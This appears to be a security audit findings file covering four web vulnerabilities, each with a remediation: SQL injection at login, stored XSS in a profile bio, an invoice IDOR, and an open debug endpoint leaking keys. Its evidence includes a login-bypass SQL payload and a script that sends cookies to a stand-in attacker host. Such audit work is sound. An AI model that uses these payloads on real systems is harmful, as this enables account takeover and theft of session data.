findings.title: SQL Injection in Login Endpoint
findings.description: The login endpoint at /api/auth/login directly interpolates user-supplied input into a SQL query without sanitization. An attacker can bypass authentication or extract the entire database contents.
findings.evidence:
Payload: ' OR '1'='1' -- 
Response: HTTP 200 with admin session cookie
Extracted: users table with 5,432 records
findings.remediation: Use parameterized queries or ORM methods. Replace string interpolation with prepared statements. Example: cursor.execute('SELECT * FROM users WHERE username = %s AND password = %s', (username, password))

findings.title: Stored XSS in User Profile Bio Field
findings.description: The user profile bio field does not sanitize HTML input before storing or rendering. Attackers can inject persistent JavaScript that executes in the browser of any user viewing the profile.
findings.evidence:
Payload: <script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
Verified cookie exfiltration from victim session.
findings.remediation: Apply HTML entity encoding on output. Use a content security policy (CSP) header. Validate and strip dangerous tags server-side using a library such as bleach.

findings.title: Insecure Direct Object Reference on Invoice Download
findings.description: The invoice download endpoint /api/invoices/{id}/download does not verify that the requesting user owns the invoice. Incrementing the numeric ID allows access to any user's financial documents.
findings.evidence: Authenticated as user ID 1001, accessed invoice ID 999 belonging to user ID 1000. HTTP 200 returned with full PDF.
findings.remediation: Add authorization check: verify invoice.owner_id == current_user.id before returning the document. Apply this check server-side for every object-level access.

findings.title: Sensitive Data Exposure via Debug Endpoint
findings.description: The /debug/config endpoint is accessible without authentication and returns internal configuration including database connection strings and third-party API keys.
findings.evidence: GET /debug/config returned 200 with JSON including DB_URL, STRIPE_SECRET_KEY, and internal IP ranges.
findings.remediation: Remove or disable debug endpoints in production. If required for internal use, protect with authentication and IP allowlisting. Rotate any exposed credentials immediately.
